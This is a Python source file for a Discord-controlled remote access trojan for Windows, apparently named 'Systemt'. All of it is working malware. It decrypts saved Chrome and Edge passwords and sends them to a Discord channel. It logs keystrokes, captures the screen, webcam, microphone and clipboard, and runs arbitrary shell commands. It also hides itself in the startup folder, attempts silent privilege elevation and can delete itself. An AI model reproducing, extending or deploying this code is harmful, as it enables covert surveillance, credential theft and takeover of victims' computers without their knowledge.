import discord
from discord.ext import commands
import subprocess
import os
import json
import datetime
import psutil
import shutil
import asyncio
import sys
import socket
import hashlib
import requests
import sqlite3
import tempfile
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ==================== CONFIG LOADING ====================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(SCRIPT_DIR, "config.json")

if not os.path.exists(CONFIG_FILE):
    print(f"Config file not found: {CONFIG_FILE}")
    sys.exit(1)

with open(CONFIG_FILE, 'r') as f:
    cfg = json.load(f)

TOKEN = cfg.get("token")
SERVER_ID = int(cfg.get("server_id"))
PREFIX = cfg.get("command_prefix", "!")
CHANNEL_NAME = cfg.get("channel_name", "systemt")
MAIN_CHANNEL_ID = cfg.get("main_channel_id", "")
CATEGORY_ID = cfg.get("category_id", "")
LOG_CHANNEL_ID = cfg.get("log_channel_id", "")
DEVICE_NAME = socket.gethostname()
CURRENT_PID = os.getpid()

# Generate unique device ID
def get_unique_device_id():
    try:
        import uuid
        mac = uuid.getnode()
        unique = hashlib.md5(f"{DEVICE_NAME}_{mac}".encode()).hexdigest()[:8]
        return f"{DEVICE_NAME}_{unique}"
    except:
        return f"{DEVICE_NAME}_{CURRENT_PID}"

DEVICE_UNIQUE_ID = get_unique_device_id()

# ==================== BOT SETUP ====================
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

current_dir = os.getcwd()
my_channel = None
main_channel = None
log_channel = None
allowed_channels = []
is_admin = False

# Features
SCREEN = CLIP = CAM = AUDIO = KEYLOG = False
try:
    import pyautogui; SCREEN = True
    import pyperclip; CLIP = True
    import cv2; CAM = True
    import sounddevice as sd; import numpy as np; from scipy.io.wavfile import write as write_wav; AUDIO = True
    from pynput import keyboard; KEYLOG = True
except:
    pass

keylogger_active = False
keylogger = None

class KeyLogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.log = ""
        self.listener = None
        self.running = False
    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                self.log += key.char
            else:
                self.log += f"[{str(key).replace('Key.', '')}]"
            if len(self.log) >= 100:
                self.write_log()
        except:
            pass
    def write_log(self):
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(self.log + '\n')
            self.log = ""
        except:
            pass
    def start(self):
        if not KEYLOG:
            return False
        try:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.running = True
            return True
        except:
            return False
    def stop(self):
        if self.log:
            self.write_log()
        if self.listener:
            self.listener.stop()
        self.running = False

async def create_or_get_channel(guild, name, category_id=None):
    existing = discord.utils.get(guild.text_channels, name=name)
    if existing:
        return existing
    category = discord.utils.get(guild.categories, id=int(category_id)) if category_id else None
    return await guild.create_text_channel(name, category=category)

async def get_or_create_unique_channel(guild, base_name, category_id=None):
    channel_name = f"{base_name}_{DEVICE_UNIQUE_ID[-8:]}"
    existing = discord.utils.get(guild.text_channels, name=channel_name)
    if existing:
        return existing
    category = discord.utils.get(guild.categories, id=int(category_id)) if category_id else None
    return await guild.create_text_channel(channel_name, category=category)

def is_startup_enabled():
    startup_folder = os.path.join(os.environ['APPDATA'], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    return os.path.exists(os.path.join(startup_folder, "Systemt.lnk"))

def add_to_startup():
    startup_folder = os.path.join(os.environ['APPDATA'], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    vbs_path = os.path.join(SCRIPT_DIR, "start.vbs")
    
    if not os.path.exists(vbs_path):
        with open(vbs_path, 'w') as f:
            f.write('Set WshShell = CreateObject("WScript.Shell")\n')
            f.write(f'WshShell.Run "pythonw ""{SCRIPT_DIR}\\Systemt.pyw""", 0, False\n')
    
    powershell_cmd = f'$WS = New-Object -ComObject WScript.Shell; $SC = $WS.CreateShortcut("{startup_folder}\\Systemt.lnk"); $SC.TargetPath = "wscript.exe"; $SC.Arguments = \'"{vbs_path}"\'; $SC.Save()'
    subprocess.run(["powershell", "-Command", powershell_cmd], capture_output=True)
    return os.path.exists(os.path.join(startup_folder, "Systemt.lnk"))

def remove_from_startup():
    startup_folder = os.path.join(os.environ['APPDATA'], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    shortcut_path = os.path.join(startup_folder, "Systemt.lnk")
    if os.path.exists(shortcut_path):
        os.remove(shortcut_path)
        return True
    return False

# ==================== LOCATION TRACKING ====================
def get_location():
    locations = []
    try:
        response = requests.get('http://ip-api.com/json/', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                locations.append({
                    'source': 'ip-api.com',
                    'city': data.get('city', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'country': data.get('country', 'Unknown'),
                    'lat': data.get('lat', 0),
                    'lon': data.get('lon', 0),
                    'isp': data.get('isp', 'Unknown'),
                    'org': data.get('org', 'Unknown')
                })
    except:
        pass
    try:
        response = requests.get('https://ipinfo.io/json', timeout=5)
        if response.status_code == 200:
            data = response.json()
            loc = data.get('loc', '0,0').split(',')
            locations.append({
                'source': 'ipinfo.io',
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'lat': float(loc[0]) if len(loc) > 0 else 0,
                'lon': float(loc[1]) if len(loc) > 1 else 0,
                'org': data.get('org', 'Unknown')
            })
    except:
        pass
    try:
        response = requests.get('https://ipapi.co/json/', timeout=5)
        if response.status_code == 200:
            data = response.json()
            locations.append({
                'source': 'ipapi.co',
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'country': data.get('country_name', 'Unknown'),
                'lat': data.get('latitude', 0),
                'lon': data.get('longitude', 0),
                'org': data.get('org', 'Unknown')
            })
    except:
        pass
    return locations[:3]

# ==================== BROWSER DATA EXTRACTION ====================
def get_default_browser():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice")
        browser = winreg.QueryValueEx(key, 'Progid')[0]
        winreg.CloseKey(key)
        return browser
    except:
        return "Unknown"

def get_chrome_passwords():
    passwords = []
    chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    if not os.path.exists(chrome_path):
        return passwords
    temp_db = tempfile.NamedTemporaryFile(delete=False)
    shutil.copy2(chrome_path, temp_db.name)
    try:
        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            try:
                password = win32crypt.CryptUnprotectData(encrypted_password)[1].decode()
            except:
                password = "[Encrypted - Need admin]"
            passwords.append(f"🔐 {url}\n   👤 {username}\n   🔑 {password}")
        conn.close()
    except:
        pass
    os.unlink(temp_db.name)
    return passwords[:10]

def get_edge_passwords():
    passwords = []
    edge_path = os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
    if not os.path.exists(edge_path):
        return passwords
    temp_db = tempfile.NamedTemporaryFile(delete=False)
    shutil.copy2(edge_path, temp_db.name)
    try:
        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            try:
                password = win32crypt.CryptUnprotectData(encrypted_password)[1].decode()
            except:
                password = "[Encrypted]"
            passwords.append(f"🔐 {url}\n   👤 {username}\n   🔑 {password}")
        conn.close()
    except:
        pass
    os.unlink(temp_db.name)
    return passwords[:10]

@bot.event
async def on_ready():
    global my_channel, main_channel, log_channel, allowed_channels, is_admin
    print(f"Bot online: {bot.user}")
    print(f"Device: {DEVICE_NAME}")
    print(f"Unique ID: {DEVICE_UNIQUE_ID}")
    
    try:
        result = subprocess.run("whoami /priv", shell=True, capture_output=True, text=True)
        is_admin = "SeTakeOwnershipPrivilege" in result.stdout
    except:
        pass
    
    guild = discord.utils.get(bot.guilds, id=SERVER_ID)
    if not guild:
        print(f"Server {SERVER_ID} not found!")
        return
    
    # Create/Get LOG channel
    if LOG_CHANNEL_ID:
        log_channel = guild.get_channel(int(LOG_CHANNEL_ID))
    if not log_channel:
        log_channel = await create_or_get_channel(guild, f"{CHANNEL_NAME}-logs", CATEGORY_ID if CATEGORY_ID else None)
        allowed_channels.append(log_channel.id)
    
    # Create UNIQUE channel for this device
    my_channel = await get_or_create_unique_channel(guild, DEVICE_NAME.lower(), CATEGORY_ID if CATEGORY_ID else None)
    allowed_channels.append(my_channel.id)
    
    # Set MAIN terminal channel
    if MAIN_CHANNEL_ID:
        main_channel = guild.get_channel(int(MAIN_CHANNEL_ID))
    if not main_channel:
        main_channel = await create_or_get_channel(guild, f"{CHANNEL_NAME}-main", CATEGORY_ID if CATEGORY_ID else None)
        allowed_channels.append(main_channel.id)
    
    # Send device info to LOG channel
    embed = discord.Embed(title="🖥️ Device Connected", color=discord.Color.green(), timestamp=datetime.datetime.now())
    embed.add_field(name="Device", value=DEVICE_NAME, inline=True)
    embed.add_field(name="Unique ID", value=DEVICE_UNIQUE_ID[-8:], inline=True)
    embed.add_field(name="IP", value=socket.gethostbyname(socket.gethostname()), inline=True)
    embed.add_field(name="Admin", value="✅" if is_admin else "❌", inline=True)
    embed.add_field(name="My Channel", value=f"#{my_channel.name}", inline=False)
    await log_channel.send(embed=embed)
    
    await main_channel.send(f"✅ **{DEVICE_NAME}** (`{DEVICE_UNIQUE_ID[-8:]}`) is ready")
    await my_channel.send(f"✅ **{DEVICE_NAME}** online\n📁 `{current_dir}`")

@bot.event
async def on_message(message):
    global current_dir, keylogger_active, keylogger, allowed_channels, is_admin, CURRENT_PID
    
    if message.author == bot.user:
        return
    
    if message.channel.id not in allowed_channels:
        return
    
    content = message.content.strip()
    if not content:
        return
    
    if content.startswith(PREFIX):
        cmd = content[len(PREFIX):].strip().lower()
    else:
        cmd = content.lower()
    
    if cmd == "help":
        await message.reply(f"""**Systemt Commands** (`{PREFIX}`)

**Device Management:**
`devices` - Show connected devices
`device` - This device info
`startup` - Add to Windows startup
`uac` - Run as admin

**Location & Data:**
`location` - Get approximate location (IP based)
`data` - Get browser data (passwords, default browser)

**Media:**
`desktop` - Screenshot
`rec <sec>` - Screen recording
`cam` - Camera photo
`clipboard` - Get clipboard
`audio <sec>` - Microphone

**Keylogger:**
`key start` - Start keylogger
`key stop` - Stop keylogger

**Files:**
`pwd`, `ls`, `cd <path>`

**System:**
`pids`, `kill <pid>`, `run <cmd>`
`shutdown`, `restart`
`exit`, `terminate`

📁 `{current_dir}`
🆔 `{DEVICE_UNIQUE_ID[-8:]}`""")
        return
    
    elif cmd == "location" or cmd == "loc":
        await message.reply("📍 Fetching location data...")
        locations = get_location()
        if locations:
            embed = discord.Embed(title="📍 Location Information", color=discord.Color.blue())
            for i, loc in enumerate(locations[:3], 1):
                embed.add_field(
                    name=f"Source {i}: {loc['source']}",
                    value=f"📍 City: {loc['city']}\n🗺️ Region: {loc['region']}\n🌍 Country: {loc['country']}\n📡 ISP: {loc.get('isp', loc.get('org', 'Unknown'))}\n📍 Coordinates: {loc['lat']}, {loc['lon']}",
                    inline=False
                )
            embed.set_footer(text="Location is approximate (based on IP address)")
            await message.reply(embed=embed)
        else:
            await message.reply("❌ Could not retrieve location data")
        return
    
    elif cmd == "data":
        await message.reply("🔍 Gathering browser data...")
        default_browser = get_default_browser()
        chrome_pass = get_chrome_passwords()
        edge_pass = get_edge_passwords()
        embed = discord.Embed(title="💻 Browser Data", color=discord.Color.green(), timestamp=datetime.datetime.now())
        embed.add_field(name="🌐 Default Browser", value=default_browser, inline=False)
        if chrome_pass:
            embed.add_field(name="🔐 Chrome Saved Passwords", value="```\n" + "\n".join(chrome_pass[:5]) + "\n```", inline=False)
        else:
            embed.add_field(name="🔐 Chrome Passwords", value="No passwords found or need admin", inline=False)
        if edge_pass:
            embed.add_field(name="🔐 Edge Saved Passwords", value="```\n" + "\n".join(edge_pass[:5]) + "\n```", inline=False)
        else:
            embed.add_field(name="🔐 Edge Passwords", value="No passwords found", inline=False)
        embed.set_footer(text="Passwords may require admin privileges to decrypt")
        await message.reply(embed=embed)
        return
    
    elif cmd.startswith("rec "):
        parts = cmd.split()
        if len(parts) < 2:
            await message.reply("Usage: `!rec <seconds>` (max 60)")
            return
        try:
            duration = int(parts[1])
            if duration > 60:
                await message.reply("Max recording time is 60 seconds")
                return
            if duration < 1:
                await message.reply("Minimum recording time is 1 second")
                return
            await message.reply(f"🎥 Recording screen for {duration} seconds...")
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = os.path.join(current_dir, f"screenrec_{timestamp}.mp4")
            ffmpeg_cmd = f'ffmpeg -f gdigrab -framerate 30 -i desktop -t {duration} -c:v libx264 -preset veryfast -crf 23 -pix_fmt yuv420p -y "{output_file}" 2>&1'
            process = await asyncio.create_subprocess_shell(
                ffmpeg_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            if os.path.exists(output_file) and os.path.getsize(output_file) > 10000:
                await message.channel.send(file=discord.File(output_file))
                os.remove(output_file)
                await message.reply(f"✅ Screen recording sent ({duration}s)")
            else:
                await message.reply("❌ FFmpeg recording failed. Make sure FFmpeg is installed correctly.")
        except ValueError:
            await message.reply("❌ Please provide a valid number of seconds")
        except Exception as e:
            await message.reply(f"❌ Error: {e}")
        return
    
    elif cmd == "devices":
        embed = discord.Embed(title="📊 Connected Devices", color=discord.Color.blue())
        embed.add_field(name=f"🖥️ {DEVICE_NAME}", 
                       value=f"✅ Online | ID: `{DEVICE_UNIQUE_ID[-8:]}`\nChannel: #{my_channel.name}",
                       inline=False)
        await message.reply(embed=embed)
        return
    
    elif cmd == "device":
        embed = discord.Embed(title="💻 Device Info", color=discord.Color.blue())
        embed.add_field(name="Name", value=DEVICE_NAME, inline=True)
        embed.add_field(name="Unique ID", value=DEVICE_UNIQUE_ID[-8:], inline=True)
        embed.add_field(name="Admin", value="✅" if is_admin else "❌", inline=True)
        embed.add_field(name="Startup", value="✅" if is_startup_enabled() else "❌", inline=True)
        embed.add_field(name="IP", value=socket.gethostbyname(socket.gethostname()), inline=True)
        embed.add_field(name="Directory", value=current_dir, inline=False)
        embed.add_field(name="My Channel", value=f"#{my_channel.name}", inline=True)
        await message.reply(embed=embed)
        return
    
    elif cmd == "startup":
        if is_startup_enabled():
            await message.reply("✅ Bot already in startup!")
            return
        success = add_to_startup()
        await message.reply("✅ Added to startup!" if success else "❌ Failed")
        return
    
    elif cmd == "removestartup":
        if not is_startup_enabled():
            await message.reply("❌ Bot not in startup!")
            return
        success = remove_from_startup()
        await message.reply("✅ Removed from startup!" if success else "❌ Failed")
        return
    
    elif cmd == "uac":
        if is_admin:
            await message.reply("✅ Already admin!")
            return
        await message.reply("🔄 Elevating... Bot will restart")
        elevate = os.path.join(SCRIPT_DIR, "elevate.ps1")
        with open(elevate, 'w') as f:
            f.write(f'Start-Process pythonw -ArgumentList "{SCRIPT_DIR}\\Systemt.pyw" -Verb RunAs -WindowStyle Hidden')
        subprocess.Popen(["powershell", "-ExecutionPolicy", "Bypass", "-File", elevate], shell=True)
        await bot.close()
        sys.exit(0)
        return
    
    elif cmd == "pwd":
        await message.reply(f"📁 `{current_dir}`")
        return
    
    elif cmd == "ls":
        try:
            files = os.listdir(current_dir)[:30]
            if files:
                out = []
                for f in files:
                    path = os.path.join(current_dir, f)
                    icon = "📁" if os.path.isdir(path) else "📄"
                    out.append(f"{icon} `{f}`")
                await message.reply(f"**{current_dir}**\n" + "\n".join(out))
            else:
                await message.reply("Empty")
        except Exception as e:
            await message.reply(f"❌ {e}")
        return
    
    elif cmd.startswith("cd "):
        path = cmd[3:].strip()
        try:
            new = path if os.path.isabs(path) else os.path.join(current_dir, path)
            if os.path.isdir(new):
                os.chdir(new)
                current_dir = os.getcwd()
                await message.reply(f"📁 `{current_dir}`")
            else:
                await message.reply(f"❌ Not found")
        except Exception as e:
            await message.reply(f"❌ {e}")
        return
    
    elif cmd == "pids":
        try:
            procs = []
            for p in psutil.process_iter(['pid', 'name']):
                try:
                    procs.append(f"`{p.info['pid']}` `{p.info['name'][:20]}`")
                except:
                    pass
            await message.reply("```\n" + "\n".join(procs[:30]) + "\n```")
        except Exception as e:
            await message.reply(f"❌ {e}")
        return
    
    elif cmd.startswith("kill "):
        if not is_admin:
            await message.reply("❌ Need admin! `!uac` first")
            return
        pid = cmd[5:].strip()
        if pid.isdigit():
            try:
                p = psutil.Process(int(pid))
                name = p.name()
                p.kill()
                await message.reply(f"✅ Killed {pid} ({name})")
            except:
                await message.reply(f"❌ Failed")
        else:
            await message.reply("Usage: kill <PID>")
        return
    
    elif cmd == "desktop":
        if not SCREEN:
            await message.reply("❌ pyautogui missing")
            return
        try:
            filename = f"ss_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            pyautogui.screenshot(filename)
            await message.channel.send(file=discord.File(filename))
            os.remove(filename)
            await message.reply("✅ Screenshot")
        except Exception as e:
            await message.reply(f"❌ {e}")
        return
    
    elif cmd == "clipboard":
        if not CLIP:
            await message.reply("❌ pyperclip missing")
            return
        try:
            text = pyperclip.paste()
            await message.reply(f"📋 **Clipboard**\n```\n{text[:1000]}\n```" if text else "Empty")
        except Exception as e:
            await message.reply(f"❌ {e}")
        return
    
    elif cmd == "cam":
        if not CAM:
            await message.reply("❌ opencv missing")
            return
        try:
            cap = cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    filename = f"cam_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                    cv2.imwrite(filename, frame)
                    await message.channel.send(file=discord.File(filename))
                    os.remove(filename)
                    await message.reply("✅ Photo")
                cap.release()
            else:
                await message.reply("No camera")
        except Exception as e:
            await message.reply(f"❌ {e}")
        return
    
    elif cmd.startswith("audio "):
        if not AUDIO:
            await message.reply("❌ sounddevice missing")
            return
        parts = cmd.split()
        dur = min(int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5, 30)
        await message.reply(f"Recording {dur}s...")
        try:
            rate = 44100
            rec = sd.rec(int(dur * rate), samplerate=rate, channels=1, dtype=np.int16)
            sd.wait()
            filename = f"audio_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
            write_wav(filename, rate, rec)
            await message.channel.send(file=discord.File(filename))
            os.remove(filename)
            await message.reply("✅ Recorded")
        except Exception as e:
            await message.reply(f"❌ {e}")
        return
    
    elif cmd.startswith("key "):
        if not KEYLOG:
            await message.reply("❌ pynput missing")
            return
        parts = cmd.split()
        if len(parts) < 2:
            await message.reply("Usage: `!key start` or `!key stop`")
            return
        action = parts[1]
        if action == "start":
            if keylogger_active:
                await message.reply("Already running")
            else:
                log = f"keylog_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                keylogger = KeyLogger(log)
                if keylogger.start():
                    keylogger_active = True
                    await message.reply(f"✅ Keylogger started\nLog: `{log}`")
                else:
                    await message.reply("Failed")
        elif action == "stop":
            if keylogger_active:
                keylogger.stop()
                keylogger_active = False
                await message.reply("✅ Stopped")
            else:
                await message.reply("Not running")
        return
    
    elif cmd.startswith("run "):
        command = cmd[4:].strip()
        async with message.channel.typing():
            try:
                r = subprocess.run(command, shell=True, cwd=current_dir, capture_output=True, text=True, timeout=30)
                out = r.stdout + r.stderr
                if out:
                    for i in range(0, len(out), 1900):
                        await message.reply(f"```\n{out[i:i+1900]}\n```")
                else:
                    await message.reply("✅ Done")
            except subprocess.TimeoutExpired:
                await message.reply("Timeout")
            except Exception as e:
                await message.reply(f"❌ {e}")
        return
    
    elif cmd == "shutdown":
        if not is_admin:
            await message.reply("❌ Need admin! `!uac` first")
            return
        await message.reply("⚠️ Shutting down in 10s...")
        await asyncio.sleep(10)
        os.system("shutdown /s /t 1")
        return
    
    elif cmd == "restart":
        if not is_admin:
            await message.reply("❌ Need admin! `!uac` first")
            return
        await message.reply("🔄 Restarting in 5s...")
        await asyncio.sleep(5)
        os.system("shutdown /r /t 1")
        return
    
    elif cmd == "exit":
        await message.reply("👋 Goodbye!")
        await bot.close()
        sys.exit(0)
        return
    
    elif cmd == "terminate":
        await message.reply("💀 Self-destructing...")
        if keylogger_active and keylogger:
            keylogger.stop()
        try:
            remove_from_startup()
            shutil.rmtree(SCRIPT_DIR, ignore_errors=True)
        except:
            pass
        await bot.close()
        sys.exit(0)
        return
    
    elif not content.startswith(PREFIX):
        async with message.channel.typing():
            try:
                r = subprocess.run(content, shell=True, cwd=current_dir, capture_output=True, text=True, timeout=30)
                out = r.stdout + r.stderr
                if out:
                    for i in range(0, len(out), 1900):
                        await message.reply(f"```\n{out[i:i+1900]}\n```")
                else:
                    await message.reply("✅ Done")
            except subprocess.TimeoutExpired:
                await message.reply("Timeout")
            except Exception as e:
                await message.reply(f"❌ {e}")
        return
    
    else:
        await message.reply(f"Unknown. Type `{PREFIX}help`")

print(f"Starting {DEVICE_NAME}...")
print(f"Unique ID: {DEVICE_UNIQUE_ID}")
bot.run(TOKEN)
